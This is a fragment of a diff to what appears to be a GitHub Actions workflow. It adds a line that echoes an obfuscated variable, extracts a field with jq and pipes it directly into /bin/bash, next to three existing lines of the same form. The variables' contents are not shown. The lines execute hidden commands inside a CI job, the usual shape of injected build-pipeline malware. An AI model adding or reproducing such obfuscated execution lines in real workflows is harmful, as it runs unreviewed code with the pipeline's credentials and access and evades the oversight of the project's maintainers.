@@ -31,6 +31,7 @@ jobs:
           echo $ld749 | jq -r .c000 | /bin/bash
           echo $lto1446 | jq -r .vtqj41199 | /bin/bash
           printf '%s' "$l95818" | jq -r .erms7 | /bin/bash
+          echo $lluk9 | jq -r .zx08 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
